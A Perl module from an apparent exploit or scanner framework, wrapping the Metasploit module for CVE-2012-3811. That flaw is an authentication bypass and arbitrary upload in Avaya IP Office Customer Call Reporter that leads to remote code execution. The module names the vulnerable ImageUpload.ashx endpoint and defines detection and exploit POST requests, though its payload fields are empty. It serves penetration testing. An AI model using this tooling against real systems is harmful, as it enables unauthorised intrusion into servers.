package AVAYA::MSF::AvayaCcrImageuploadExec;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "AvayaCcrImageuploadExec";

   my $DETECTION = {
  METHOD => 'POST',
  PATH => '/CCRWebClient/Wallboard/ImageUpload.ashx',
  PAYLOAD => '',
  TEXT => 'Checking If : /CCRWebClient/Wallboard/ImageUpload.ashx Exists ...',
  VALIDATION   => {
    TCODE => ['200'],
  },
   };

my $EXPLOIT = {
  CVE => "CVE-2012-3811",
  DESCRIPTION => "

          This module exploits an authentication bypass vulnerability on Avaya IP Office

        Customer Call Reporter, which allows a remote user to upload arbitrary files

        through the ImageUpload.ashx component. It can be abused to upload and execute

        arbitrary ASP .NET code. The vulnerability has been tested successfully on Avaya IP

        Office Customer Call Reporter 7.0.4.2 and 8.0.8.15 on Windows 2003 SP2.

      ",
  MSF_MODULE => "avaya_ccr_imageupload_exec",
  OSVDB => 83399,
  PATHS => [""],
  REFERENCES => ["https://downloads.avaya.com/css/P8/documents/100164021"],
  TITLE => "Avaya IP Office Customer Call Reporter ImageUpload.ashx Remote Command Execution",
  VARIABLES => {
    'PATH' =>       {
  DESCRIPTION => "The URI path of the Avaya CCR applications",
  VALUE => "/",
},
  },

  TYPE => 'MSF',
  PLATFORM => 'WINDOWS',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'CCRWebClient/Wallboard/ImageUpload.ashx',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [POST] /CCRWebClient/Wallboard/ImageUpload.ashx',
      HEADERS      => {
        'Content-Type' => 'multipart/form-data; boundary=---------------------------lJopbEDWBtoIwnAUjmLmItOzmOpLEeXhrvah',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
